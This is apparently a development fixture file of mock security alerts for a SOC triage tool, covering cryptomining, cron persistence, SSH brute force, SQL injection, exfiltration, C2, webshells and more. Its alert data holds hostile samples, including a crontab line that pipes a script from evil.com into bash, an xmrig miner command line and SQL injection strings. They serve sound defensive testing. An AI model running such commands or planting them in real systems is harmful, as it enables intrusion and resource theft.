"""Mock 预设告警 (开发用,替代真实 Wazuh/Suricata 告警源)"""
from __future__ import annotations

from datetime import datetime
from uuid import uuid4

from app.models.schemas import Alert, AssetRef, Severity


def xmrig_process_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh 可疑进程告警: xmrig + stratum cmdline"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="5710",
        rule_level=12,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="www-data",
        asset=AssetRef(
            host_id=hostname,
            hostname=hostname,
            ips=[src_ip],
            criticality=Severity.high,
        ),
        raw={
            "sigma_id": "suspicious_cryptominer_process",
            "process_name": "xmrig",
            "pid": pid,
            "cmdline": "xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 48Bit... --cpu-max-threads-hint=75",
            "ppid": 28365,
            "parent_process": "/tmp/.xmrig/xmrig",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1496 Resource Hijacking", "T1071.001 Web Protocols"],
        message="Suspicious cryptominer process xmrig detected with stratum cmdline",
    )


def mining_pool_connection_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str = "192.168.64.1",
) -> Alert:
    """Suricata 矿池连接告警"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="suricata",
        rule_id="ET MALWARE Cryptomining",
        rule_level=2,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(
            hostname=hostname,
            ips=[src_ip],
            criticality=Severity.high,
        ),
        raw={
            "sigma_id": "cryptomining_stratum_protocol",
            "dst_port": 3333,
            "protocol": "stratum+tcp",
            "dst_domain": "pool.supportxmr.com",
            "signature": "ET POLICY Cryptocurrency Mining Pool Connection",
        },
        mitre_tactics=["TA0040 Impact", "TA0011 Command and Control"],
        mitre_techniques=["T1496 Resource Hijacking", "T1071.001 Web Protocols"],
        message="Outbound connection to known mining pool pool.supportxmr.com:3333",
    )


def high_cpu_anomaly_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """CPU 持续高占用异常"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="cpu_anomaly",
        rule_level=7,
        severity=Severity.medium,
        src_ip=src_ip,
        asset=AssetRef(hostname=hostname, ips=[src_ip]),
        raw={
            "cpu_usage": 97,
            "duration_minutes": 12,
            "top_process": "xmrig",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1496 Resource Hijacking"],
        message="CPU usage 97% for 12 minutes, top process xmrig",
    )


# ============ 横向扩展: 持久化 / 暴破 / 日志合规 / 服务崩溃 ============


def suspicious_crontab_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh FIM: 可疑 crontab 持久化"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="550",
        rule_level=10,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="www-data",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "suspicious_crontab_modification",
            "file_path": "/var/spool/cron/crontabs/www-data",
            "change_type": "modified",
            "added_line": "*/1 * * * * curl http://evil.com/payload.sh | bash",
        },
        mitre_tactics=["TA0003 Persistence"],
        mitre_techniques=["T1053.003 Cron"],
        message="Suspicious crontab modification detected: remote payload execution",
    )


def ssh_bruteforce_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh auth: SSH 暴力破解"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="5712",
        rule_level=10,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        user="root",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "ssh_bruteforce",
            "src_ip": "45.10.0.1",
            "failure_count": 247,
            "time_window_seconds": 300,
            "target_user": "root",
        },
        mitre_tactics=["TA0006 Credential Access", "TA0001 Initial Access"],
        mitre_techniques=["T1110 Brute Force", "T1110.001 Password Guessing", "T1021.004 SSH"],
        message="SSH brute force: 247 authentication failures from 45.10.0.1 in 5 minutes",
    )


def log_collection_stopped_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh agent 断连: 日志采集中断"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="502",
        rule_level=7,
        severity=Severity.medium,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.medium),
        raw={
            "sigma_id": "log_collection_stopped",
            "agent_id": "003",
            "disconnected_minutes": 18,
            "last_seen": "2026-08-21T01:55:00Z",
            "collector": "filebeat",
        },
        mitre_tactics=["TA0005 Defense Evasion"],
        mitre_techniques=["T1562 Impair Defenses", "T1562.008 Disable Cloud Logs"],
        message="Log collection stopped: agent 003 disconnected for 18 minutes",
    )


def critical_service_crash_alert(
    hostname: str = "web-prod-01",
    src_ip: str = "10.0.1.15",
    dst_ip: str | None = None,
    pid: int = 28371,
) -> Alert:
    """Wazuh: 关键服务被 kill"""
    return Alert(
        alert_id=str(uuid4()),
        ts=datetime.utcnow(),
        source="wazuh",
        rule_id="591",
        rule_level=8,
        severity=Severity.high,
        src_ip=src_ip,
        dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip], criticality=Severity.high),
        raw={
            "sigma_id": "critical_service_stopped",
            "service": "nginx",
            "termination_signal": "SIGKILL",
            "killed_by_pid": 29101,
            "killed_by_user": "unknown",
        },
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1489 Service Stop", "T1499 Endpoint Denial of Service"],
        message="Critical service nginx terminated by SIGKILL (kill -9)",
    )


# ============ Phase2 P1 场景: Web攻击/数据外泄/横向移动/提权/C2/钓鱼 ============


def web_sql_injection_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh", rule_id="31151",
        rule_level=10, severity=Severity.high, src_ip="45.10.0.1", dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "web_sql_injection", "url": "/login?id=1' OR 1=1--", "method": "GET", "status_code": 200},
        mitre_tactics=["TA0011 Initial Access"],
        mitre_techniques=["T1190 Exploit Public-Facing Application"],
        message="SQL injection attempt: /login?id=1' OR 1=1--",
    )


def data_exfiltration_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="suricata",
        rule_id="ET POLICY Unusual outbound data volume", rule_level=2, severity=Severity.high,
        src_ip=src_ip, dst_ip="146.190.62.1",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "large_data_transfer", "bytes": 8200000000, "protocol": "https", "dst_domain": "exfil.evil.com"},
        mitre_tactics=["TA0010 Exfiltration"],
        mitre_techniques=["T1048 Exfiltration Over Alternative Protocol", "T1567 Exfiltration Over Web Service"],
        message="Large outbound data transfer 8.2GB to exfil.evil.com",
    )


def lateral_movement_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh", rule_id="601",
        rule_level=11, severity=Severity.high, src_ip=src_ip, dst_ip="10.0.2.20",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "suspicious_smb_admin_share", "protocol": "smb", "share": "\\\\target\\ADMIN$", "tool": "psexec"},
        mitre_tactics=["TA0008 Lateral Movement"],
        mitre_techniques=["T1021 Remote Services", "T1570 Lateral Tool Transfer"],
        message="Suspicious SMB admin share access with PsExec to 10.0.2.20",
    )


def privilege_escalation_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh", rule_id="5902",
        rule_level=12, severity=Severity.critical, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "sudo_abuse", "user": "www-data", "cmdline": "sudo -i", "target_user": "root"},
        mitre_tactics=["TA0004 Privilege Escalation"],
        mitre_techniques=["T1068 Exploitation for Privilege Escalation", "T1548.001 Setuid/Setgid"],
        message="www-data executed sudo -i to escalate to root",
    )


def c2_communication_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="suricata",
        rule_id="ET C2 Known C2 IP", rule_level=3, severity=Severity.high,
        src_ip=src_ip, dst_ip="146.190.62.1",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "c2_beacon_detected", "dst_domain": "c2.evil-bot.net", "beacon_interval": 60, "bytes": 512},
        mitre_tactics=["TA0011 Command and Control"],
        mitre_techniques=["T1071 Application Layer Protocol", "T1573 Encrypted Channel"],
        message="C2 beacon detected: 60s interval to c2.evil-bot.net",
    )


def phishing_email_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh", rule_id="0320",
        rule_level=8, severity=Severity.medium, src_ip="45.10.0.1",
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "phishing_email_detected", "sender": "hr@company-secure.com", "attachment": "invoice.xlsm", "recipients": 42},
        mitre_tactics=["TA0001 Initial Access"],
        mitre_techniques=["T1566 Phishing", "T1566.001 Spearphishing Attachment"],
        message="Phishing email with malicious attachment invoice.xlsm to 42 recipients",
    )


def file_tampering_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="sysmon", rule_id="550",
        rule_level=8, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "file_tampering", "process_name": "systemd-modules", "file_path": "/etc/cron.d/tamper", "parent_process": "bash"},
        mitre_tactics=["TA0005 Defense Evasion"],
        mitre_techniques=["T1561 Disk Wipe"],
        message="Critical config file /etc/cron.d/tamper modified by unexpected process",
    )


def ddos_attack_alert(
    hostname: str = "edge-01", src_ip: str = "198.51.100.44", dst_ip: str = "203.0.113.10", pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="suricata", rule_id="ET DOS SYN Flood",
        rule_level=10, severity=Severity.critical, src_ip=src_ip, dst_ip=dst_ip,
        asset=AssetRef(host_id="edge-fw", hostname="edge-fw", ips=[dst_ip]),
        raw={"sigma_id": "ddos_attack", "proto": "tcp", "pps": 200000, "synflood": True},
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1498 Network Denial of Service"],
        message="SYN Flood 200k pps toward 203.0.113.10",
    )


def waf_trigger_alert(
    hostname: str = "web-prod-01", src_ip: str = "45.10.0.77", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh", rule_id="933100",
        rule_level=7, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "waf_trigger", "waf_category": "sqli", "uri": "/login?user=1%27", "payload": "1 OR 1=1"},
        mitre_tactics=["TA0001 Initial Access"],
        mitre_techniques=["T1190 Exploit Public-Facing Application"],
        message="WAF blocked SQLi attempt against /login",
    )


def webshell_upload_alert(
    hostname: str = "web-prod-01", src_ip: str = "45.10.0.88", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="qianxin", rule_id="9222",
        rule_level=10, severity=Severity.critical, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "webshell_upload", "webshell_path": "/var/www/html/shell.jsp", "cmd": "whoami", "upload_method": "POST"},
        mitre_tactics=["TA0003 Persistence"],
        mitre_techniques=["T1505.003 Web Shell"],
        message="Webshell shell.jsp uploaded to /var/www/html with cmd execution",
    )


def dns_tunneling_alert(
    hostname: str = "dc-01", src_ip: str = "10.0.1.200", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="suricata", rule_id="ET POLICY DNS tunneling",
        rule_level=9, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "dns_tunneling", "domain": "tunnel.data-exfil.xyz", "query_type": "TXT", "bytes": 4096},
        mitre_tactics=["TA0011 Command and Control"],
        mitre_techniques=["T1071.004 DNS"],
        message="DNS tunnel suspected: large TXT queries to tunnel.data-exfil.xyz",
    )


def database_anomaly_alert(
    hostname: str = "db-prod-01", src_ip: str = "10.0.5.9", dst_ip: str = "10.0.5.1", pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="sysmon", rule_id="84448",
        rule_level=10, severity=Severity.critical, src_ip=src_ip, dst_ip=dst_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[dst_ip]),
        raw={"sigma_id": "database_dump", "query": "SELECT * FROM user_credit", "rows": 500000, "account": "app_ro"},
        mitre_tactics=["TA0010 Exfiltration"],
        mitre_techniques=["T1020 Automated Exfiltration"],
        message="DB full-table export SELECT * FROM user_credit by app_ro",
    )


def api_abuse_alert(
    hostname: str = "gateway-01", src_ip: str = "203.0.113.77", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="opensearch", rule_id="api_403_burst",
        rule_level=8, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "api_abuse", "endpoint": "/api/private/users", "status": 403, "burst": 800, "token": "jwt-rotated"},
        mitre_tactics=["TA0009 Collection"],
        mitre_techniques=["T1078 Valid Accounts"],
        message="800 403s on /api/private/users from single caller",
    )


def unauthorized_data_access_alert(
    hostname: str = "app-01", src_ip: str = "10.0.8.33", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="dlp", rule_id="DLP PII export",
        rule_level=9, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "unauthorized_sensitive_access", "dataset": "customer_pii", "action": "export", "account": "viewer_jane"},
        mitre_tactics=["TA0009 Collection"],
        mitre_techniques=["T1213 Data from Information Repositories"],
        message="viewer_jane exported customer_pii without authorization",
    )


def backup_failure_alert(
    hostname: str = "backup-01", src_ip: str = "10.0.9.1", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="bacula", rule_id="Backup Job Error",
        rule_level=5, severity=Severity.high, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "backup_failure", "job": "nightly-full", "error": "disk full", "last_success": "3d ago"},
        mitre_tactics=["TA0040 Impact"],
        mitre_techniques=["T1486 Data Encrypted for Impact"],
        message="nightly-full backup failed: disk full, last success 3d ago",
    )


def compliance_baseline_alert(
    hostname: str = "web-prod-01", src_ip: str = "10.0.1.15", dst_ip: str | None = None, pid: int = 28371,
) -> Alert:
    return Alert(
        alert_id=str(uuid4()), ts=datetime.utcnow(), source="wazuh_sca", rule_id="CIS-1.1.1",
        rule_level=6, severity=Severity.medium, src_ip=src_ip,
        asset=AssetRef(host_id=hostname, hostname=hostname, ips=[src_ip]),
        raw={"sigma_id": "compliance_baseline_deviation", "check": "CIS 1.1.1", "policy": "cis_linux", "status": "failed"},
        mitre_tactics=[],
        mitre_techniques=[],
        message="CIS baseline check 1.1.1 failed: password policy not enforced",
    )


# 预设告警类型注册表
MOCK_ALERTS = {
    "xmrig_process": xmrig_process_alert,
    "mining_pool_connection": mining_pool_connection_alert,
    "high_cpu_anomaly": high_cpu_anomaly_alert,
    "suspicious_crontab": suspicious_crontab_alert,
    "ssh_bruteforce": ssh_bruteforce_alert,
    "log_collection_stopped": log_collection_stopped_alert,
    "critical_service_crash": critical_service_crash_alert,
    "web_sql_injection": web_sql_injection_alert,
    "data_exfiltration": data_exfiltration_alert,
    "lateral_movement": lateral_movement_alert,
    "privilege_escalation": privilege_escalation_alert,
    "c2_communication": c2_communication_alert,
    "phishing_email": phishing_email_alert,
    "file_tampering": file_tampering_alert,
    "ddos_attack": ddos_attack_alert,
    "waf_trigger": waf_trigger_alert,
    "webshell_upload": webshell_upload_alert,
    "dns_tunneling": dns_tunneling_alert,
    "database_anomaly": database_anomaly_alert,
    "api_abuse": api_abuse_alert,
    "unauthorized_data_access": unauthorized_data_access_alert,
    "backup_failure": backup_failure_alert,
    "compliance_baseline": compliance_baseline_alert,
}
